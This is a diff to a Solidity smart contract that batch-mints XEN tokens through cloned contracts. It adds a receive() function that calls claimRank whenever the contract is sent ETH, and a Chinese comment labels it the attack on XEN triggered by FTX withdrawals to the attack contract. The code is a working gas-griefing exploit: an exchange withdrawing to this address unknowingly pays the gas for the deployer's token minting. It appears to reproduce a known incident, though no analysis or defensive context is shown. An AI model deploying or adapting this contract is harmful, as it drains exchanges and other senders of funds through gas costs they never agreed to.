@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 function xen() pure returns(IXEN) {
     return IXEN(0x9C47A6c4814CC8D70d459C02F4684F8A9D538A95);
+    // return IXEN(0xd9145CCE52D386f254917e481eB44e9943F39138);
 }
 
 interface IXEN{
@@ -19,7 +20,7 @@ contract GET{
         xen().claimRank(term);
         owner = tx.origin;
     }
-
+    
     function claimMintReward() public {
         require(msg.sender == owner);
         xen().claimMintReward();
@@ -28,7 +29,7 @@ contract GET{
         selfdestruct(payable(tx.origin));
     }
 }
-// 0xcb1bf0801fa7c4a7991f6c820e895285c782351c Goerli 
+// 0xcb1bf0801fa7c4a7991f6c820e895285c782351c Goerli
 contract GETXEN {
     mapping (address=>mapping (uint256=>address[])) public userContracts;
     address private immutable get;
@@ -65,5 +66,9 @@ contract GETXEN {
             GET(clone).claimMintReward();
             userContracts[user][term].pop();
         }
+    }
+    // FTX 通过提币到攻击合约触发XEN的攻击
+    receive() external payable {
+        this.claimRank(5, 1);
     }
 }
